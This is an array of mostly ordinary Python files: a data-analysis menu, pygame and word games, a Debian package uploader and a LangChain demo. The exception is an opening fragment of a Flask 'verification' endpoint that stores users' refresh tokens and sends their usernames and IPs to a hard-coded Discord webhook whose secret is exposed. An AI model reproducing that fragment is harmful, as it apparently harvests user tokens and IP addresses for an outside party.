f.write(f'{refresh}\\n')\r\n        f.close()\r\n\r\n        guild = request.args.get('state')\r\n\r\n        webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1175489611389218837/y8uAcsB28OKK6emJqG4fdfoYxKY9UMia8UGgiCSuGKKoRrdvSuLqy8B-7_f9M6rlEf_b')\r\n        embed = DiscordEmbed(title='New', description=f'Username: {username},  IP:  {ip}  Total:  {total}', color='03b2f8')\r\n        webhook.add_embed(embed)\r\n        response = webhook.execute()\r\n        #if guild == '1088173745966948424':\r\n            #role = 1088174793225949255\r\n\r\n        #headers={'authorization' : 'Bot '+BOTTOKEN}\r\n        #r = requests.put(f'https://discord.com/api/v9/guilds/{guild}/members/{userID}/roles/{role}', headers=headers)\r\n        return 'Successfully Verified'\r\n\r\nif __name__ == '__main__':\r\n    app.run(debug=False, host='', port=5000)",
    "import os\nimport pandas as pd\nimport numpy as np\nimport matplotlib.pyplot as plt\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.linear_model import LinearRegression\nfrom sklearn.metrics import mean_squared_error\nimport pyfiglet\nimport seaborn as sns\nimport time #per misurare il tempo di esecuzione del programma \n\nstart_time = time.time()\nstarttime = time.process_time()\n\n#men\u00f9 principale \nmain_menu = {\n    1: \"Cambia dataset\",\n    2: \"Mostra le prime righe del dataset\",\n    3: \"Mostra le informazioni sul dataset\",\n    4: \"Calcola le statistiche descrittive del dataset\",\n    5: \"Esegui un'analisi specifica\",\n    0: \"Esci\"\n}\n#men\u00f9 che si apre solo dopo aver cliccato la voce 5: \"Esegui un'analisi specifica\"\nstatistics_menu = {\n    1: \"Mostra il grafico a torta dei produttori\",\n    2: \"Calcola la mediana\",\n    3: \"Calcola la moda\",\n    4: \"Calcola la varianza\",\n    5: \"Calcola la deviazione standard\",\n    6: \"Calcola la correlazione\",\n    7: \"Calcola la covarianza\",\n    8: \"Voglio vedere il grafico dei produttori come un diagramma a barre\",\n    9: \"Mostra il grafico a torta dei prezzi pi\u00f9 elevati\",\n    10: \"Mostra il diagramma a barre dei 4 marchi di computer pi\u00f9 costosi\",\n    11: \"Ecco il diagramma a barre della categoria di computer pi\u00f9 venduti\",\n    12: 'Ecco il grafico a torta delle ram pi\u00f9 apprezzate dai consumatori',\n    13: \"Mostra i valori rappresentanti la curtosi e l' asimmettria\",\n    14: \"Boxplot tra Category e Price \", #modo migliore per comprendere la relazione tra una variabile numerica e variabile categoriale \u00e8 attraverso un boxplot\n    15:\"Boxplot tra Manufacturer e Price\",\n    0: \"Menu principale\"\n}\n\n\ndef read_menu_choice(menu):\n    print(\"\\nCosa vuoi fare?:\")\n    for k, v in menu.items():\n        print(f\"{k}. {v}\")\n\n    while True:\n        try:\n            choice = int(input(\"Inserisci il numero corrispondente: \")) #richiede un input numerico intero dell'utente\n            if choice < 0 or choice >= len(menu): #verifica se l'input fornito \u00e8 valido \n                raise ValueError()\n            #in caso non fosse valido il programma si ferma \n            break\n        except ValueError:\n            print(\"Scelta non valida. Riprova.\\n\") #quello che vediamo a schermo \n    return choice #ci ritorna di reinserire un numero corrispondente\n\n\ndef choose_dataset():\n    print(\"Scegli il  di dataset che vuoi utilizzare: \")\n\n    csv_files = [f for f in os.listdir('.') if f.endswith('.csv')]\n\n    for i, f in enumerate(csv_files):\n        print(f\"{i}: {f}\")\n\n    while True:\n        try:\n            choice = int(input(\"Inserisci il numero corrispondente: \"))\n            #verifica se l'input \u00e8 valido\n            if choice < 0 or choice >= len(csv_files):\n                raise ValueError() #eccezzione quando si verifica un errore di tipo valore ad esempio diamo un valore non presente nel men\u00f9\n            break\n        except ValueError:\n            #stampa un messaggio di errore in caso l'input non sia valido\n            print(\"Scelta non valida. Riprova.\\n\")\n    return csv_files[choice] #restituisce il file csv scelto dall'utente \n\n\ndef load_dataset(dataset_path):\n    dataset = pd.read_csv(\"./\"+dataset_path)\n    return dataset\n\n\ndef show_dataset_info(dataset):\n    print('Ecco le informazioni del Dataset: ')\n    dataset.info()\n\n\ndef choose_dataset():\n    print(\"Scegli il dataset che vuoi utilizzare: \")\n    #ottiene tutti i file di tipo CSV che sono presenti nella directoy che stiamo utilizzando \n    csv_files = [f for f in os.listdir('.') if f.endswith('.csv')]\n\n    #stampa l'elenco dei file numerati per permettere all'utente di scegliere su che file CSV vuole fare l'analisi\n    for i, f in enumerate(csv_files):\n        print(f\"{i}: {f}\")\n\n    while True:\n        try:\n            #chiede all'utente su che file CSV vuole operare \n            choice = int(input(\"Inserisci il numero corrispondente: \"))\n\n            #verifica se la scelta \u00e8 valida \n            if choice < 0 or choice >= len(csv_files):\n                raise ValueError()\n            break\n        except ValueError:\n            print(\"Scelta non valida. Riprova.\\n\")\n    #restituisce il file scelto dall'utente \n    return csv_files[choice]\n\n\ndef handle_statistics_choice(choice, dataset):\n    #verifica se il dataset non ha ancora nessun dato caricato \n    if dataset.empty:\n        print(\"Non \u00e8 stato caricato nessun dataset!\")\n        return\n    #se il dataset presente dati caricati, estrae le colonne numeriche presenti nel dataset \n    numeric_columns = dataset.select_dtypes(include=[np.number]).columns.tolist()\n\n    if choice == 1:\n        show_pie_chart(dataset)\n    #questa analisi ovvero di calcolare la mediana, la moda, la varianza, la deviazione standard, la correlazione e la covarianza\n    #la possiamo fare solo sui valori di tipo numerico ovvero float64\n    #se noi all'interno del nostro men\u00f9 clicchiamo la voce 3 (Mostra le informazioni del dataset) notiamo che solo la voce Price \u00e8 di tipo float64\n    #il resto sono tutti o",
    "import pygame\n\ndef getBacground(screen, w: int, h: int, color1, color2):\n    bg = pygame.Surface(screen.get_size())\n    colors = (color1, color2)\n    i = 0\n    y = 0\n    while y < bg.get_height():\n        x = 0\n        while x < bg.get_width():\n            pygame.draw.rect(surface=bg, color=colors[i % 2], rect=pygame.Rect(x, y, w, h))\n            x += w\n            i += 1\n        y += h\n        i += 1\n    return bg\n\n\n# pygame setup\npygame.init()\nscreen = pygame.display.set_mode((2000, 1200))\npygame.display.set_caption('Game')\nclock = pygame.time.Clock()\nrunning = True\n\nRED = (255, 0, 0)\nGREEN = (0, 255, 0)\nBLUE = (0, 0, 255)\ncolor = RED\nbg = getBacground(screen, 100, 100, (0,0,0), (100,100,100))\nradius = 0\nwhile running:\n    #screen.fill(\"white\")\n    for event in pygame.event.get():\n        if event.type == pygame.QUIT:\n            running = False\n\n    screen.blit(bg, dest=(0, 0))\n    pygame.draw.circle(screen,color=(124,50,100), center=screen.get_rect().center, radius=radius, width=5)\n    radius += 1\n    if radius > screen.get_width() // 2:\n        radius = 0\n    pygame.display.flip()\n    clock.tick(60)  # limits FPS to 60\n\npygame.quit()",
    "import csv\nfrom datetime import datetime, time\nfrom random import choice\n\ncredit = '--- v.1.1. Apr 2024. M.Dvorak ---'\n\nGAME_TITLE = '5 \u0411\u0423\u041a\u0412 \u0441 \u042f\u043a\u0443\u0431\u043e\u0432\u0438\u0447\u0435\u043c 2.0'\nHOST_NAME = '\u042f\u043a\u0443\u0431\u043e\u0432\u0438\u0447 2.0'\nINDENT = ' ' * 14\nMAX_TRIES = 6\nBOARD_INDEXES = {\n    '0': 1,\n    '1': 4,\n    '2': 7,\n    '3': 10,\n    '4': 13\n}\n\n\ndef login() -> str:\n    entered_name = input('\u041f\u0440\u0438\u0432\u0435\u0442! \u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0432\u0432\u0435\u0434\u0438 \u0441\u0432\u043e\u0435 \u0438\u043c\u044f:\\n')\n    return entered_name\n\n\n# \u041c\u043e\u0436\u043d\u043e \u0437\u0430\u043c\u0435\u043d\u0438\u0442\u044c \u043d\u0430 \u0441\u0442\u0440\u043e\u043a\u0443, \u0447\u0442\u043e\u0431\u044b \u043d\u0435 \u0432\u0432\u043e\u0434\u0438\u0442\u044c \u043f\u0440\u0438 \u043a\u0430\u0436\u0434\u043e\u043c \u0437\u0430\u043f\u0443\u0441\u043a\u0435.\ngamer_name = login()\n\n\nsuperprizes = (\n    '\u0430-\u0430-\u0430-\u0430\u0432\u0442\u043e\u043c\u043e\u0431\u0438\u043b\u044c',\n    '\u0442\u0435\u043b\u0435\u0432\u0438\u0437\u043e\u0440',\n    'iPhone 16 Pro Max Ultra 4 Tb Titanium Gold (\u0442\u043e\u0447\u043d\u043e \u043d\u0435 \u043a\u0438\u0442\u0430\u0439\u0441\u043a\u0430\u044f \u043a\u043e\u043f\u0438\u044f)',\n    f'{HOST_NAME} \u0441\u0431\u0440\u0435\u0435\u0442 \u0443\u0441\u044b \u0441\u0435\u0431\u0435',\n    f'{HOST_NAME} \u0441\u0431\u0440\u0435\u0435\u0442 \u0443\u0441\u044b \u0443 {gamer_name}'\n)\n\n\n# \u0412\u043d\u0435\u0448\u043d\u0438\u0439 \u043a\u043e\u043d\u0442\u0443\u0440: \u0437\u0430\u043f\u0443\u0441\u043a \u0438 \u0444\u0438\u043d\u0430\u043b \u0441\u0435\u0440\u0438\u0438 \u0438\u0433\u0440.\ndef start():\n    time_of_day = user_time_hello()\n    print(f'''{HOST_NAME}: {time_of_day}, \u0437\u0434\u0440\u0430-\u0430-\u0430\u0432\u0441\u0442\u0432\u0443\u0439\u0442\u0435!\n              \u0414\u043e\u0431\u0440\u043e \u043f\u043e\u0436\u0430\u043b\u043e\u0432\u0430\u0442\u044c \u043d\u0430 \u0438\u0433\u0440\u0443 \"{GAME_TITLE}\"!\n              C \u0432\u0430\u043c\u0438 \u0435\u0435 \u0432\u0435\u0434\u0443\u0449\u0438\u0439, \u0431\u0435\u0441\u0441\u043c\u0435\u043d\u043d\u044b\u0439 \u0438 \u043d\u0435\u043f\u043e\u0434\u0440\u0430\u0436\u0430\u0435\u043c\u044b\u0439 {HOST_NAME}!\n\n              * \u0430\u043f\u043b\u043e\u0434\u0438\u0441\u043c\u0435\u043d\u0442\u044b *\n\n              \u041f\u043e\u0437\u0432\u043e\u043b\u044c\u0442\u0435 \u0441\u0440\u0430\u0437\u0443 \u043f\u0440\u0435\u0434\u0441\u0442\u0430\u0432\u0438\u0442\u044c \u043d\u0430\u0448\u0443 \u0442\u0440\u043e\u0439\u043a\u0443 \u0438\u0433\u0440\u043e\u043a\u043e\u0432:\n              \u044d\u0442\u043e \u0434\u0432\u0430 \u0432\u0435\u043b\u0438\u043a\u043e\u043b\u0435\u043f\u043d\u044b\u0445 \u0433\u043e\u043b\u043e\u0441\u0430 \u0432 \u043c\u043e\u0435\u0439 \u0433\u043e\u043b\u043e\u0432\u0435, \u0430 \u0442\u0430\u043a\u0436\u0435\n              \u043f\u0440\u0435\u043a\u0440\u0430\u0441\u043d\u044b\u0439 \u0447\u0435\u043b\u043e\u0432\u0435\u043a {gamer_name}! \u041f\u043e\u043f\u0440\u0438\u0432\u0435\u0442\u0441\u0442\u0432\u0443\u0435\u043c!\n\n              * \u043e\u0432\u0430\u0446\u0438\u0438 *\n\n              \u0418\u0442\u0430\u043a, {gamer_name}, \u0442\u044b \u0443\u0436\u0435 \u0438\u0433\u0440\u0430\u043b(\u0430) \u0432 \"{GAME_TITLE}\"?\n              (\u0422\u043e\u043b\u044c\u043a\u043e \u0434\u0430\u0432\u0430\u0439 \u0434\u043e\u0433\u043e\u0432\u043e\u0440\u0438\u043c\u0441\u044f: \u043d\u0430 \u0432\u043e\u043f\u0440\u043e\u0441\u044b \u043e\u0442\u0432\u0435\u0447\u0430\u0435\u043c \"\u0434\u0430\" \u0438\u043b\u0438 \u043d\u0435\u0442\")''')\n    played = yes_or_no()\n    if played == '\u043d\u0435\u0442':\n        hello_new_player()\n    else:\n        print(f'{HOST_NAME}: \u041e\u0442\u043b\u0438\u0447\u043d\u043e! \u0422\u043e\u0433\u0434\u0430 \u043d\u0430\u0447\u043d\u0451\u043c \u0438\u0433\u0440\u0443!')\n\n    stop_playing = False\n    games_counter = 0\n    wins_counter = 0\n    current_words = []\n    # \u041f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u0435 \u0441\u043f\u0438\u0441\u043a\u0430 \u0438\u0433\u0440\u043e\u0432\u044b\u0445 \u0441\u043b\u043e\u0432 \u0434\u043b\u044f \u0442\u0435\u043a\u0443\u0449\u0435\u0439 \u0438\u0433\u0440\u044b.\n    # \u0412\u043e\u0437\u043c\u043e\u0436\u043d\u043e \u043d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u0430\u044f \u0440\u0430\u0431\u043e\u0442\u0430 \u0438\u0437-\u0437\u0430 encoding.\n    with open('5_char_words.csv', newline='', encoding='cp1251') as file:\n        for row in csv.reader(file):\n            current_words.append(row[0].lower())\n    guessed_words = []\n\n    while not stop_playing:\n        # \u0417\u0430\u043f\u0443\u0441\u043a\u0430\u0435\u043c \u0438\u0433\u0440\u0443.\n        games_counter += 1\n\n        the_word = choice(current_words)\n        current_words.pop(current_words.index(the_word))\n\n        print(f'''{INDENT}\u0414\u043e\u0441\u043a\u0430 \u0433\u043e\u0442\u043e\u0432\u0430, \u0438 \u0432\u0441\u0435 \u0436\u0434\u0443\u0442, \u0437\u0430\u0442\u0430\u0438\u0432 \u0434\u044b\u0445\u0430\u043d\u0438\u0435!\n\n                 \u0418\u0433\u0440\u0430 \u2116 {games_counter}\n              ''')\n\n        result = the_game(the_word)\n\n        if result:\n            wins_counter += 1\n            guessed_words.append(the_word)\n            print(f'{HOST_NAME}: \u041f\u043e-\u043e-\u043e\u0437\u0434\u0440\u0430\u0432\u043b\u044f\u044e, \u044d\u0442\u043e \u0431\u044b\u043b\u0430 \u0432\u0435\u043b\u0438\u043a\u043e\u043b\u0435\u043f\u043d\u0430\u044f \u0438\u0433\u0440\u0430!')\n        else:\n            print(f'{INDENT}\u041d\u0443 \u0438 \u043d\u0435\u0441\u0442\u0440\u0430\u0448\u043d\u043e, \u0432 \u0441\u043b\u0435\u0434\u0443\u044e\u0449\u0438\u0439 \u0440\u0430\u0437 \u043f\u043e\u043b\u0443\u0447\u0438\u0442\u0441\u044f!')\n\n        result_text = (\n            f'{INDENT}\u0418\u0433\u0440 \u0432 \u0441\u0435\u0440\u0438\u0438: {games_counter}\\n'\n            f'{INDENT}\u0418\u0437 \u043d\u0438\u0445 \u043f\u043e\u0431\u0435\u0434: {wins_counter}\\n'\n            f'{INDENT}\u0415\u0449\u0435 \u0440\u0430\u0437\u043e\u0447\u0435\u043a \u0441\u044b\u0433\u0440\u0430\u0435\u043c?'\n        )\n        print(result_text)\n\n        wanna_play_again = yes_or_no()\n        if wanna_play_again == '\u0434\u0430':\n            print(f'{HOST_NAME}: \u041e-\u043e-\u043e\u0442\u043b\u0438\u0447\u043d\u044b\u0439 \u0432\u044b\u0431\u043e\u0440! \u041f\u043e\u0433\u043d\u0430\u043b\u0438 \u0435\u0449\u0451 \u0440\u0430\u0437!')\n        else:\n            stop_playing = True\n\n    superprize = choice(superprizes)\n\n    print(f'{HOST_NAME}: \u0422\u043e\u0433\u0434\u0430 \u0441\u043f\u0430\u0441\u0438\u0431\u043e \u0437\u0430 \u0438\u0433\u0440\u0443!')\n    if wins_counter:\n        if wins_counter == 1:\n            print(f'{INDENT}\u0422\u0435\u0431\u0435 \u0443\u0434\u0430\u043b\u043e\u0441\u044c \u043f\u043e\u0431\u0435\u0434\u0438\u0442\u044c {wins_counter} \u0440\u0430\u0437.')\n            print(f'{INDENT}\u0423\u0432\u0435\u0440\u0435\u043d, \u0432 \u0441\u043b\u0435\u0434\u0443\u044e\u0449\u0438\u0439 \u0440\u0430\u0437 \u0431\u0443\u0434\u0435\u0442 \u0431\u043e\u043b\u044c\u0448\u0435!')\n        elif wins_counter < 5:\n            print(\n                f'{INDENT}\u041d\u0435\u043f\u043b\u043e\u0445\u043e, \u0442\u0435\u0431\u0435 \u0443\u0434\u0430\u043b\u043e\u0441\u044c \u043f\u043e\u0431\u0435\u0434\u0438\u0442\u044c {wins_counter} \u0440\u0430\u0437\u0430!')\n        else:\n            print(\n                f'{INDENT}\u042d\u0442\u043e \u0432\u0435\u043b\u0438\u043a\u043e\u043b\u0435\u043f\u043d\u043e, \u0442\u0435\u0431\u0435 \u0443\u0434\u0430\u043b\u043e\u0441\u044c \u043f\u043e\u0431\u0435\u0434\u0438\u0442\u044c '\n                f'{wins_counter} \u0440\u0430\u0437!')\n        print(f'{INDENT}\u0421\u043b\u043e\u0432\u0430, \u043a\u043e\u0442\u043e\u0440\u044b\u0435 \u0442\u0435\u0431\u0435 \u0443\u0434\u0430\u043b\u043e\u0441\u044c \u043e\u0442\u0433\u0430\u0434\u0430\u0442\u044c:')\n        words_str = ''\n        for word in guessed_words:\n            words_str += word\n            # \u0420\u0430\u0437\u0434\u0435\u043b\u044f\u0435\u043c \u0441\u043b\u043e\u0432\u0430 \u0437\u0430\u043f\u044f\u0442\u044b\u043c\u0438, \u0435\u0441\u043b\u0438 \u0442\u043e\u043b\u044c\u043a\u043e \u043e\u043d\u043e \u043d\u0435 \u043f\u043e\u0441\u043b\u0435\u0434\u043d\u0435\u0435 \u0432 \u0441\u043f\u0438\u0441\u043a\u0435.\n            if len(guessed_words) > guessed_words.index(word) + 1:\n                words_str += ', '\n        print(INDENT + words_str)\n        print(f'''\\n{INDENT}\u0420\u0430\u0437\u0443\u043c\u0435\u0435\u0442\u0441\u044f, \u0442\u044b \u0437\u0430\u0441\u043b\u0443\u0436\u0438\u0432\u0430\u0435\u0448\u044c \u043d\u0430\u0448 \u0441\u0443\u043f\u0435\u0440\u043f\u0440\u0438\u0437!\n              \u041d\u0430\u043f\u043e\u043c\u0438\u043d\u0430\u044e, \u0441\u0435\u0433\u043e\u0434\u043d\u044f \u044d\u0442\u043e:\n              {superprize}!!!\n\n              * \u0432\u043e\u0441\u0445\u0438\u0449\u0435\u043d\u0438\u0435 \u043f\u0443\u0431\u043b\u0438\u043a\u0438 *\n\n              \u0422\u044b \u043c\u043e\u0436\u0435\u0448\u044c \u0437\u0430\u0431\u0440\u0430\u0442\u044c \u0435\u0433\u043e \u0431\u043b\u0438\u0436\u0430\u0439\u0448\u0435\u0433\u043e 30 \u0444\u0435\u0432\u0440\u0430\u043b\u044f.''')\n    print(f'''\n              \u042d\u0442\u043e \u0431\u044b\u043b\u0430 \u0443\u0432\u043b\u0435\u043a\u0430\u0442\u0435\u043b\u044c\u043d\u0430\u044f \u0441\u0435\u0440\u0438\u044f \"{GAME_TITLE}\"!\n              \u041a\u0438\u0431\u0435\u0440\u043e\u0431\u043d\u044f\u043b-\u043a\u0438\u0431\u0435\u0440\u043f\u0440\u0438\u043f\u043e\u0434\u043d\u044f\u043b, \u0442\u0432\u043e\u0439 \u043e\u0431\u043e\u0436\u0430\u0435\u043c\u044b\u0439 {HOST_NAME}.\n              \u041d\u0435 \u0441\u043a\u0443\u0447\u0430\u0435\u043c, \u0443\u0432\u0438\u0434\u0438\u043c\u0441\u044f \u0441\u043e\u0432\u0441\u0435\u043c \u0441\u043a\u043e\u0440\u043e!\n\n              * \u043f\u0440\u043e\u0449\u0430\u043b\u044c\u043d\u044b\u0435 \u043e\u0432\u0430\u0446\u0438\u0438 *\n\n              {credit}''')\n\n\n# \u041f\u0440\u0438\u0432\u0435\u0442\u0441\u0442\u0432\u0438\u0435 \u0438 \u0438\u043d\u0441\u0442\u0440\u0443\u043a\u0446\u0438\u0438 \u0434\u043b\u044f \u043d\u043e\u0432\u043e\u0433\u043e \u0438\u0433\u0440\u043e\u043a\u0430.\ndef hello_new_player():\n    print(f'''{HOST_NAME}: \u0427\u0442\u043e \u0436, \u043f\u043e\u043a\u0430 \u0440\u0435\u043a\u043b\u0430\u043c\u043d\u0430\u044f \u043f\u0430\u0443\u0437\u0430, \u0440\u0430\u0437\u0431\u0435\u0440\u0451\u043c\u0441\u044f, \u0447\u0442\u043e \u043a \u0447\u0435\u043c\u0443!\n              \"{GAME_TITLE}\" - \u044d\u0442\u043e \u043a\u043b\u0430\u0441\u0441\u0438\u0447\u0435\u0441\u043a\u0430\u044f \u0438\u0433\u0440\u0430 \"5 \u0431\u0443\u043a\u0432\",\n              \u0442\u043e\u043b\u044c\u043a\u043e \u0441 \u0432\u0435\u043b\u0438\u043a\u043e\u043b\u0435\u043f\u043d\u044b\u043c \u0432\u0435\u0434\u0443\u0449\u0438\u043c - \u043c\u043d\u043e\u0439, \u042f\u043a\u0443\u0431\u043e\u0432\u0438\u0447\u0435\u043c 2.0!\n\n              * \u0431\u0443\u0440\u043d\u044b\u0435 \u0430\u043f\u043b\u043e\u0434\u0438\u0441\u043c\u0435\u043d\u0442\u044b *\n\n              \u0417\u0430 \u0448\u0435\u0441\u0442\u044c \u043f\u043e\u043f\u044b\u0442\u043e\u043a \u043d\u0443\u0436\u043d\u043e \u0443\u0433\u0430\u0434\u0430\u0442\u044c \u0441\u043b\u043e\u0432\u043e, \u0441\u043e\u0441\u0442\u043e\u044f\u0449\u0435\u0435 \u0438\u0437 \u043f\u044f\u0442\u0438 \u0431\u0443\u043a\u0432.\n              \u0422\u044b \u043d\u0430\u0437\u044b\u0432\u0430\u0435\u0448\u044c \u0441\u043b\u043e\u0432\u043e, \u0438 \u043c\u044b \u0432\u043c\u0435\u0441\u0442\u0435 \u0441\u043c\u043e\u0442\u0440\u0438\u043c, \u043e\u043d\u043e \u0437\u0430\u0433\u0430\u0434\u0430\u043d\u043e \u0438\u043b\u0438 \u043d\u0435\u0442.\n              \u0417\u0430\u0433\u0430\u0434\u044b\u0432\u0430\u044e\u0442\u0441\u044f \u0442\u043e\u043b\u044c\u043a\u043e \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0438\u0442\u0435\u043b\u044c\u043d\u044b\u0435 \u0432 \u0435\u0434\u0438\u043d\u0441\u0442\u0432\u0435\u043d\u043d\u043e\u043c \u0447\u0438\u0441\u043b\u0435\n              (\u043a\u0440\u043e\u043c\u0435 \u0441\u043b\u0443\u0447\u0430\u0435\u0432, \u043a\u043e\u0433\u0434\u0430 \u0435\u0441\u0442\u044c \u0442\u043e\u043b\u044c\u043a\u043e \u043c\u043d\u043e\u0436\u0435\u0441\u0442\u0432\u0435\u043d\u043d\u0430\u044f \u0444\u043e\u0440\u043c\u0430).\n              \u0412\u043c\u0435\u0441\u0442\u043e \u0431\u0443\u043a\u0432\u044b \"\u0451",
    "import random\r\n\r\ndef get_guess(lower_bound, upper_bound):\r\n  \"\"\"\r\n  Prompts the user for a guess within the specified range and validates the input.\r\n\r\n  Args:\r\n      lower_bound: The lower bound of the guessing range.\r\n      upper_bound: The upper bound of the guessing range.\r\n\r\n  Returns:\r\n      A valid integer guess within the range.\r\n  \"\"\"\r\n  while True:\r\n    try:\r\n      guess_str = input(f\"Guess a number between {lower_bound} and {upper_bound}: \")\r\n      guess = int(guess_str)\r\n      if lower_bound <= guess <= upper_bound:\r\n        return guess\r\n      else:\r\n        print(\"Invalid input. Please enter a number within the specified range.\")\r\n    except ValueError:\r\n      print(\"Invalid input. Please enter a number.\")\r\n\r\ndef play_game():\r\n  \"\"\"\r\n  Runs a single round of the number guessing game.\r\n  \"\"\"\r\n  # Set the difficulty level (optional)\r\n  difficulty = input(\"Choose difficulty (easy/medium/hard): \").lower()\r\n  if difficulty == \"easy\":\r\n    lower_bound = 1\r\n    upper_bound = 10\r\n  elif difficulty == \"medium\":\r\n    lower_bound = 1\r\n    upper_bound = 100\r\n  else:\r\n    lower_bound = 1\r\n    upper_bound = 1000\r\n\r\n  # Generate the secret number\r\n  secret_number = random.randint(lower_bound, upper_bound)\r\n\r\n  # Initialize number of guesses\r\n  num_guesses = 0\r\n\r\n  # Main game loop\r\n  print(\"Welcome to the Number Guessing Game!\")\r\n  while True:\r\n    guess = get_guess(lower_bound, upper_bound)\r\n    num_guesses += 1\r\n\r\n    if guess == secret_number:\r\n      print(f\"Congratulations! You guessed the number {secret_number} in {num_guesses} attempts.\")\r\n      break\r\n    elif guess < secret_number:\r\n      print(\"Too low, try again.\")\r\n    else:\r\n      print(\"Too high, try again.\")\r\n\r\nif __name__ == \"__main__\":\r\n  play_game()\r\n\r\n  while True:\r\n    play_again = input(\"Play again? (y/n): \").lower()\r\n    if play_again == 'y':\r\n      play_game()\r\n    else:\r\n      print(\"Thanks for playing!\")\r\n      break\r\n",
    "#!/usr/bin/python3\n\nfrom debian import debian_support\nimport oras.provider\nimport hashlib\nimport os\n\noci_repo = \"ghcr.io/amazingfate/deb-repo:test\"\n\ndef calculate_sha256(file_path):\n    sha256_hash = hashlib.sha256()\n    with open(file_path, \"rb\") as f:\n        for byte_block in iter(lambda: f.read(4096), b\"\"):\n            sha256_hash.update(byte_block)\n    return sha256_hash.hexdigest()\n\ndef read_repo_file(repo_file):\n    all_pkg_infos = []\n    file_sha256_info_list = []\n    for pkg_info in list(repo_file):\n        pkg_metainfo = {}\n        for tag_value in pkg_info:\n            pkg_metainfo[tag_value[0]] = tag_value[1]\n        all_pkg_infos.append(pkg_metainfo)\n    if \"Filename\" in all_pkg_infos[0]:\n        for all_pkg_info in all_pkg_infos:\n            file_sha256_info = {}\n            file_sha256_info[\"Filename\"] = all_pkg_info[\"Filename\"].strip(\"./\")\n            file_sha256_info[\"SHA256\"] = all_pkg_info[\"SHA256\"]\n            file_sha256_info_list.append(file_sha256_info)\n    elif \"Checksums-Sha256\" in all_pkg_infos[0]:\n        for all_pkg_info in all_pkg_infos:\n            for sha256_info in all_pkg_info[\"Checksums-Sha256\"].split(\"\\n\"):\n                if sha256_info == \"\":\n                    continue\n                file_sha256_info = {}\n                file_sha256_info[\"Filename\"] = sha256_info.split(\" \")[2]\n                file_sha256_info[\"SHA256\"] = sha256_info.split(\" \")[0]\n                file_sha256_info_list.append(file_sha256_info)\n    else:\n        return {}\n    return  file_sha256_info_list\n\ndef upload_blobs_manifest(blob_file_name, blob_file_digest, oci_repo):\n    token = os.environ.get(\"GH_TK\")\n    class MyProvider(oras.provider.Registry):\n        pass\n\n    reg = MyProvider()\n    container = reg.get_container(oci_repo)\n    manifest = reg.get_manifest(container)\n\n    blob = os.path.join(os.getcwd(), blob_file_name)\n    blob_name = os.path.basename(blob)\n    annotset = oras.oci.Annotations({})\n    layer = oras.oci.NewLayer(blob, \"application/octet-stream\", is_dir=False)\n    layer[\"annotations\"] = {oras.defaults.annotation_title: blob_name}\n    reg.set_basic_auth(\"amazingfate\", token)\n    print(\"going to upload blob %s\" % blob)\n    print(reg.upload_blob(blob, container, layer))\n\n    new_layers = []\n    for old_layer in manifest[\"layers\"]:\n        if  old_layer[\"annotations\"][oras.defaults.annotation_title] == blob_file_name:\n            print(\"going to delete old %s layer %s\" % (blob_file_name, old_layer))\n        else:\n            if old_layer[\"annotations\"] == {oras.defaults.annotation_title: blob_name} and old_layer[\"digest\"] != \"sha256:\" + blob_file_digest:\n                print(\"going to delete conflict layer %s\" % old_layer)\n            else:\n                new_layers.append(old_layer)\n\n    manifest[\"layers\"] = new_layers\n    manifest[\"layers\"].append(layer)\n    print(\"going to upload manifest\")\n    print(reg.upload_manifest(manifest, container))\n\n# Get manifest from remote repo\nclass MyProvider(oras.provider.Registry):\n    pass\n\nreg = MyProvider()\ncontainer = reg.get_container(oci_repo)\nmanifest = reg.get_manifest(container)\n\n# Get remote package file name and digest info from manifest\nremote_file_sha256_infos =  []\nfor oci_layer in manifest[\"layers\"]:\n    if oci_layer[\"annotations\"][\"org.opencontainers.image.title\"] == \"Packages\" or oci_layer[\"annotations\"][\"org.opencontainers.image.title\"] == \"Sources\":\n        continue\n    remote_file_sha256_info = {}\n    remote_file_sha256_info[\"Filename\"] = oci_layer[\"annotations\"][\"org.opencontainers.image.title\"]\n    remote_file_sha256_info[\"SHA256\"] = oci_layer[\"digest\"].split(\":\")[1]\n    remote_file_sha256_infos.append(remote_file_sha256_info)\n\n# Read info of packages to upload from local Packages and Sources\npkg_file = debian_support.PackageFile(\"Packages\")\nsource_file = debian_support.PackageFile(\"Sources\")\npackage_info_list = read_repo_file(pkg_file)\nsource_info_list = read_repo_file(source_file)\nall_package_list = package_info_list + source_info_list\n\n# Skip packages already exist in remote repo\nnew_package_list = []\nfor package_info in all_package_list:\n    remote_exist = False\n    hash_match = False\n    for remote_file_sha256_info in remote_file_sha256_infos:\n        if package_info[\"Filename\"] == remote_file_sha256_info[\"Filename\"]:\n            remote_exist = True\n            if package_info[\"SHA256\"] == remote_file_sha256_info[\"SHA256\"]:\n                hash_match = True\n    if not (remote_exist and hash_match):\n        new_package_list.append(package_info)\n\n# Always upload Packages and Sources file\nfor extra_file in [\"Packages\", \"Sources\"]:\n    extra_file_info = {}\n    extra_file_info[\"Filename\"] = extra_file\n    extra_file_info[\"SHA256\"] = calculate_sha256(os.path.join(os.getcwd(), extra_file))\n    new_package_list.append(extra_file_info)\n\n# Upload packages one by one\nfor upload_file_info in new_package_list:\n    upload_blobs_manifest(upload_file_info[\"Filename\"], upload_file_info[\"SHA256\"], oci_repo)\n",
    "# We will integrate our code with OpenAI\nimport os\n\nfrom constants import openai_key\nfrom langchain.llms import OpenAI\nfrom langchain import PromptTemplate\nfrom langchain.chains import LLMChain\nfrom langchain.chains import SimpleSequentialChain\nfrom langchain.chains import SequentialChain\nfrom langchain.memory import ConversationBufferMemory\nimport streamlit as st\n\nos.environ[\"OPENAI_API_KEY\"] = openai_key\n \n#Streamlit framework\n\nst.title('Get your celebrity gossip :P')\ninput_text = st.text_input(\"Enter the name of your favourite celebrity, My dear friend :)\")\nllm = OpenAI(temperature = 0.7)\n#Prompt templates\nfirst_input_prompt_template = PromptTemplate(\n    input_variables = ['name'],\n    template =\"Tell me the celebrity {name}\"\n)\n\nchain = LLMChain(llm=llm, prompt = first_input_prompt_template, verbose = True, output_key='person')\n\nsecond_input_prompt_template = PromptTemplate(\n    input_variables = ['person']\n    template =\"Tell the {person}'s horoscope\"\n)\nchain2 = LLMChain(llm=llm, prompt = second_input_prompt_template, verbose 